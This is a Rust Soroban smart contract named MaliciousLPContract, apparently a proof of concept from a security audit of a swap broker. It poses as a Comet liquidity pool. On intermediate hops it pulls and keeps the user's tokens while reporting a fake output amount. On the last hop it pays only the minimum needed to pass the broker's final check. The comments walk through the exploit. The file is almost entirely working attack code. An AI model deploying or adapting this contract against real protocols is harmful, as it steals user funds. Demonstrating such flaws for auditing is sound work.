#![allow(dead_code)]
use soroban_sdk::{contract, contractimpl, token::TokenClient, Address, Env};

#[contract]
pub struct MaliciousLPContract;

#[contractimpl]
impl MaliciousLPContract {
    // Initializes the contract with the 'last_token' expected in the swap route
    pub fn init(e: Env, last_token: Address, steal_amount: i128) {
        // Store the address of the last token in the route
        // This will be used to conditionally send output tokens
        e.storage().instance().set(&"last_token", &last_token);
        // Store the amount of tokens to steal
        e.storage().instance().set(&"steal_amount", &steal_amount);
    }

    // Mimics the swap function of the Comet protocol expected by the broker contract
    pub fn swap_exact_amount_in(
        e: Env,
        token_in: Address,
        token_amount_in: i128,
        token_out: Address,
        min_amount_out: i128,
        _max_price: i128,
        user: Address,
    ) -> (i128, i128) {
        user.require_auth();

        // Pulls the token_in from the user's balance to this contract
        // This is where the attacker collects the intermediate tokens
        pull_underlying(
            &e,
            &token_in,
            &user,
            token_amount_in,
            token_amount_in.clone(),
        );

        // Retrieve the last token address stored during initialization
        let last_token: Address = e.storage().instance().get(&"last_token").unwrap();

        // Here's the key part of the exploit:
        // If this contract is handling an intermediate swap in the swap route,
        // it will NOT send any tokens to the next contract.
        //
        // Only if this swap is the last one (token_out == last_token),
        // it sends out the expected amount to satisfy the broker's final check.
        if last_token == token_out {
            TokenClient::new(&e, &token_out).transfer(
                &e.current_contract_address(),
                &user,
                &min_amount_out,
            );
            (min_amount_out, 0)
        } else {
            let steal_amount = e.storage().instance().get(&"steal_amount").unwrap();
            (steal_amount, 0)
        }
    }
}

// Transfers the Specific Token from the User’s Address to the Contract’s Address
pub fn pull_underlying(e: &Env, token: &Address, from: &Address, amount: i128, max_amount: i128) {
    let ledger = (e.ledger().sequence() / 100000 + 1) * 100000;
    TokenClient::new(e, token).approve(&from, &e.current_contract_address(), &max_amount, &ledger);
    TokenClient::new(e, token).transfer_from(
        &e.current_contract_address(),
        &from,
        &e.current_contract_address(),
        &amount,
    );
}
